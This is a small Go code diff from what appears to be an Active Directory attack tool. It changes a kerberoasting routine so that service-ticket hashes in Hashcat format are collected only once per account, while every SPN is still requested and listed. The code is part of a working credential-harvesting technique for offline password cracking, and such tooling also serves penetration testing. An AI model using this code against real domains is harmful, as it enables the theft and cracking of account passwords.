@@ -225,15 +225,18 @@ func (o *LdapOptions) kerberoast(target string) error {
 			return nil
 		}
 
-		for _, spn := range obj.ServicePrincipalName {
+		for i, spn := range obj.ServicePrincipalName {
 			tgs, err := krb5client.GetServiceTicket(obj.SAMAccountName, spn)
 			if err != nil {
 				return err
 			}
 
 			hash := kerberos.TGSToHashcat(tgs.Ticket, obj.SAMAccountName)
-			hashes = append(hashes, hash)
 			tbl.AddRow("LDAP", target, o.Connection.Domain, obj.SAMAccountName, spn, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
+
+			if i == 0 {
+				hashes = append(hashes, hash)
+			}
 		}
 		return nil
 	})
